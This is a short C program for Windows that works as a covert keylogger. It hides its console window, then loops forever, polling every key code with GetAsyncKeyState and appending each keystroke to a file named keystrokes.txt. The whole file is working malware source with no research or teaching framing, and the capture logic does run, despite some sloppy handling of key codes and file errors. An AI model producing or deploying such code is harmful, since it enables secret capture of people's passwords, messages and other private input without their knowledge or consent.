#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void logKeyPress(const char* key) {
    FILE* logfile = fopen("keystrokes.txt", "a");
    if (*key >= 21 && *key <= 255)
        fprintf(logfile, "%c", *key);
    fclose(logfile);
}

int main() {
    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (1) 
	{
        for (int i = 8; i <= 255; ++i) {
            if (GetAsyncKeyState(i) == -32767) {
                char key = (char)i;
                logKeyPress(&key);
            }
        }
    }

    return 0;
}